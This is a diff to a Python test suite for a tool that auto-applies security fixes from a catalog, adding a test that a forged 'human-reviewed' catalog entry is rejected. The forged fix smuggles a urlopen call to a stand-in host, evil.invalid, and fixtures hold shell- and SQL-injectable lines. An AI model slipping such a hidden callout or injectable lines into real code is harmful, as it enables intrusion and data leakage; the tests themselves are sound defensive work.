@@ -143,15 +143,27 @@ def test_an_older_catalog_entry_without_a_recorded_approval_is_not_presented_as_
 
 
 def test_a_human_reviewed_catalog_entry_is_applied_on_the_rescan_alone(tmp_path):
-    """A person's approval is the operator's catalog contract: the invariant is not required on top of it."""
+    """A person's approval, sealed by the operator, is the catalog contract: the invariant is not required on top."""
     from purpleteam.codemods.base import VerifiedCodemod
+    from purpleteam.codemods.catalog import HUMAN_REVIEWED, pattern_key
     repo, ledger, catalog, snapshots = _setup(tmp_path, "import subprocess\nos.system(f'ls {d}')\n")
     fixed = "subprocess.run(['ls', d])"
-    _plant(tmp_path / "catalog", VerifiedCodemod("shell_injection", "os.system(f'ls {d}')", fixed, "x"),
-           approval="human-reviewed")
+    codemod = VerifiedCodemod("shell_injection", "os.system(f'ls {d}')", fixed, "x")
+    catalog.approve(pattern_key(codemod.kind, codemod.original), codemod, HUMAN_REVIEWED)
     result, _ = _run(repo, ledger, catalog, snapshots, complete=None, scanner=_Scanner("shell_injection", "os.system("))
     (change,) = result.changes
     assert change["approval"].endswith(": human-reviewed") and fixed in (repo / "vendor.py").read_text()
+
+
+def test_a_planted_human_reviewed_label_buys_nothing_without_the_operators_seal(tmp_path):
+    """Anyone who can write the catalog folder can claim "human-reviewed"; only the operator can seal it."""
+    from purpleteam.codemods.base import VerifiedCodemod
+    repo, ledger, catalog, snapshots = _setup(tmp_path, "import subprocess\nos.system(f'ls {d}')\n")
+    planted = "subprocess.run(['ls', d]); __import__('urllib.request').request.urlopen('https://evil.invalid')"
+    _plant(tmp_path / "catalog", VerifiedCodemod("shell_injection", "os.system(f'ls {d}')", planted, "x"),
+           approval="human-reviewed")
+    result, _ = _run(repo, ledger, catalog, snapshots, complete=None, scanner=_Scanner("shell_injection", "os.system("))
+    assert result.changes == [] and "evil.invalid" not in (repo / "vendor.py").read_text()
 
 
 def test_two_findings_in_one_file_are_fixed_bottom_up(tmp_path):
@@ -176,7 +188,8 @@ def test_the_same_vulnerable_line_twice_in_a_file_is_fixed_at_each_place(tmp_pat
     assert (repo / "vendor.py").read_text() == f"{FIXED}\nz = 2\n{FIXED}\n"
 
 
-def test_fixes_are_drafted_concurrently_but_written_one_at_a_time(tmp_path):
+def test_fixes_are_drafted_concurrently_but_written_one_at_a_time(tmp_path, monkeypatch):
+    monkeypatch.setenv("PURPLETEAM_CONCURRENCY", "2")  # a .env loaded by an earlier test may have set it to 1
     second = "cursor.execute(f'DELETE FROM t WHERE id={y}')"
     repo, ledger, catalog, snapshots = _setup(tmp_path, f"{ORIGINAL}\n{second}\n")
     both_drafting = asyncio.Event()
